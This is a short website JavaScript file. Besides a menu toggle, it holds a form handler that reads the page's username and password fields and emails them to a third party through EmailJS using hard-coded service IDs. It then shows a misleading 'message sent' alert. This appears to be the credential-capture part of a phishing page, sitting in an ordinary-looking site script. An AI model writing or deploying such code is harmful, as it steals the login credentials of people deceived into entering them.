document.querySelector('.menu-toggle').addEventListener('click', function() {
    const navLinks = document.querySelector('.nav-links');
    navLinks.classList.toggle('active');
});

// Initialize EmailJS with your User ID
emailjs.init("4Ejw-vJeWsb65fM5x"); // Replace with your actual EmailJS user ID

function sendmail(event) {
    event.preventDefault(); // Prevent the form from submitting

    var params = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value,
    };

    const serviceID = "service_gwrhhw5";
    const templateID = "template_kas5dsb";

    emailjs.send(serviceID, templateID, params)
        .then(res => {
            document.getElementById("username").value = "";
            document.getElementById("password").value = "";
            console.log(res);
            alert("Your message was sent successfully!");
        })
        .catch(err => {
            console.log(err);
            alert("Failed to send the message. Please try again.");
        });
}

// Attach the sendmail function to the form's submit event
document.querySelector('form').addEventListener('submit', sendmail);